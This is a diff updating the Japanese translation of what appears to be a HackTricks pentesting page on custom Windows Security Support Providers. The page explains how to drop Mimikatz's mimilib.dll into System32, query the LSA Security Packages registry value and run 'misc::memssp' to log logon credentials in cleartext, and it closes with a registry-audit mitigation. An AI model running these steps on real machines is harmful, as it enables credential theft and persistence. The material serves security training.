@@ -1,17 +1,17 @@
-# カスタム SSP
+# Custom SSP
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### カスタム SSP
+### Custom SSP
 
-[SSP (セキュリティサポートプロバイダー) についてはこちらで学んでください。](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
-**自分の SSP** を作成して、マシンにアクセスするために使用される **資格情報** を **平文** で **キャプチャ** できます。
+[SSP（セキュリティサポートプロバイダー）についてはこちらで学んでください。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
+自分の**SSP**を作成して、**クリアテキスト**で**資格情報**を**キャプチャ**することができます。
 
 #### Mimilib
 
-Mimikatz によって提供される `mimilib.dll` バイナリを使用できます。**これにより、すべての資格情報が平文でファイルにログされます。**\
-dll を `C:\Windows\System32\` に配置します。\
-既存の LSA セキュリティパッケージのリストを取得します：
+Mimikatzが提供する`mimilib.dll`バイナリを使用できます。**これにより、すべての資格情報がクリアテキストでファイルにログされます。**\
+dllを`C:\Windows\System32\`に配置します。\
+既存のLSAセキュリティパッケージのリストを取得します：
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
@@ -31,10 +31,10 @@ Mimikatzを使用して、これをメモリ内に直接注入することもで
 privilege::debug
 misc::memssp
 ```
-これは再起動では生き残りません。
+この変更は再起動後に持続しません。
 
 #### 緩和策
 
-イベントID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` の監査作成/変更
+イベント ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` の監査作成/変更
 
 {{#include ../../banners/hacktricks-training.md}}
